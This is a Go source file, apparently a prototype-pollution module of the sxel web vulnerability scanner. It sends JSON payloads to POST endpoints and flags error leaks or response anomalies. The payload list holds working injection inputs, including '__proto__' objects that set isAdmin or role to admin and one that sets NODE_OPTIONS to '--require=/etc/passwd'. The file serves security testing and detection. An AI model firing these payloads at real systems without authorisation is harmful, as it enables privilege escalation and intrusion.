package modules

import (
	"bytes"
	"fmt"
	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"net/http"
	"strings"
	"time"
)

// protoPollutionPayloads contains test cases for JavaScript prototype pollution.
type protoPollutionTest struct {
	Label    string
	JSONBody string
	Marker   string // we check if this property persists server-side (if reflected)
}

var protoPollutionPayloads = []protoPollutionTest{
	{
		Label:    "__proto__ pollution — isAdmin",
		JSONBody: `{"__proto__":{"isAdmin":true}}`,
		Marker:   "isAdmin",
	},
	{
		Label:    "__proto__ pollution — role",
		JSONBody: `{"__proto__":{"role":"admin"}}`,
		Marker:   "role",
	},
	{
		Label:    "constructor.prototype pollution",
		JSONBody: `{"constructor":{"prototype":{"isAdmin":true}}}`,
		Marker:   "isAdmin",
	},
	{
		Label:    "__proto__ pollution — shell",
		JSONBody: `{"__proto__":{"shell":"node","env":{"NODE_OPTIONS":"--require=/etc/passwd"}}}`,
		Marker:   "shell",
	},
	{
		Label:    "Nested __proto__ in array",
		JSONBody: `{"items":[{"__proto__":{"admin":true}}]}`,
		Marker:   "admin",
	},
	{
		Label:    "Pollution via toString",
		JSONBody: `{"__proto__":{"toString":"polluted"}}`,
		Marker:   "toString",
	},
	{
		Label:    "Pollution via valueOf",
		JSONBody: `{"__proto__":{"valueOf":"polluted"}}`,
		Marker:   "valueOf",
	},
	{
		Label:    "__proto__ with nested object",
		JSONBody: `{"user":{"__proto__":{"role":"admin"}},"name":"test"}`,
		Marker:   "role",
	},
	{
		Label:    "JSON.parse bypass via constructor",
		JSONBody: `{"constructor":{"prototype":{"polluted":true}},"normalKey":"value"}`,
		Marker:   "polluted",
	},
}

// ScanProtoPollution tests POST endpoints that accept JSON for prototype
// pollution vulnerabilities by sending __proto__ and constructor.prototype
// injection payloads and checking for reflection or behavioral differences.
func ScanProtoPollution(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	// Collect POST endpoints
	postEndpoints := map[string]bool{target.URL: true}
	for _, form := range target.Forms {
		if strings.ToUpper(form.Method) == "POST" && form.Action != "" {
			postEndpoints[form.Action] = true
		}
	}

	for endpoint := range postEndpoints {
		if cfg.Verbose {
			output.Verbose("[proto-pollution] probing %s", endpoint)
		}

		// Baseline: send a normal JSON object
		baselineBody, baselineStatus, err := doJSONPostRaw(client, cfg, endpoint, `{"test":"sxsc_normal_baseline"}`)
		if err != nil || baselineStatus == 404 || baselineStatus == 405 || baselineStatus == 415 {
			continue // endpoint doesn't accept JSON
		}

		for _, pl := range protoPollutionPayloads {
			body, status, err := doJSONPostRaw(client, cfg, endpoint, pl.JSONBody)
			if err != nil {
				continue
			}

			bodyLow := strings.ToLower(body)
			baselineLow := strings.ToLower(baselineBody)

			// 1. JSON error messages that reveal prototype pollution acceptance
			// Only use true error/side-effect markers, not key names that
			// could be echoed back from the payload itself (false positive).
			errorMarkers := []string{
				"cannot read properties", "undefined is not",
				"typeerror", "unexpected token",
				"is not a function", "cannot set property",
			}
			for _, marker := range errorMarkers {
				if strings.Contains(bodyLow, marker) && !strings.Contains(baselineLow, marker) {
					ev := fmt.Sprintf("marker %q leaked in response (HTTP %d)", marker, status)
					results = append(results, core.ScanResult{
						Type:      "Prototype Pollution — Server-Side Reflection",
						URL:       endpoint,
						Method:    "POST",
						Parameter: "body",
						Payload:   pl.Label,
						Severity:  "HIGH",
						Evidence:  ev,
						Timestamp: time.Now(),
					})
					break
				}
			}

			// 2. Behavioral difference: response length differs significantly
			lenDiff := len(body) - len(baselineBody)
			if lenDiff < 0 {
				lenDiff = -lenDiff
			}
			if lenDiff > 200 && status == 200 {
				// This is a weaker signal — the server may have processed the prototype
				// injection differently, changing the JSON response shape.
				if !containsProtoResult(results, endpoint, pl.Label) {
					results = append(results, core.ScanResult{
						Type:      "Prototype Pollution — Potential (Response Anomaly)",
						URL:       endpoint,
						Method:    "POST",
						Parameter: "body",
						Payload:   pl.Label,
						Severity:  "MEDIUM",
						Evidence:  fmt.Sprintf("response length diff: %d bytes (HTTP %d) — possible prototype pollution processing", lenDiff, status),
						Timestamp: time.Now(),
					})
				}
			}
		}
	}

	return results
}

// doJSONPostRaw sends arbitrary JSON bytes as a POST request. Unlike doJSONPOST
// in nosqli.go, this one takes a raw string and doesn't require a parameter name.
func doJSONPostRaw(client *http.Client, cfg *core.Config, rawURL, jsonBody string) (string, int, error) {
	cfg.Limiter.Wait()
	req, err := http.NewRequest("POST", rawURL, bytes.NewBufferString(jsonBody))
	if err != nil {
		return "", 0, err
	}
	core.ApplyHeaders(req, cfg)
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()
	b := core.ReadBody(resp.Body)
	return b, resp.StatusCode, nil
}

func containsProtoResult(results []core.ScanResult, endpoint, label string) bool {
	for _, r := range results {
		if r.URL == endpoint && strings.Contains(r.Payload, label) {
			return true
		}
	}
	return false
}
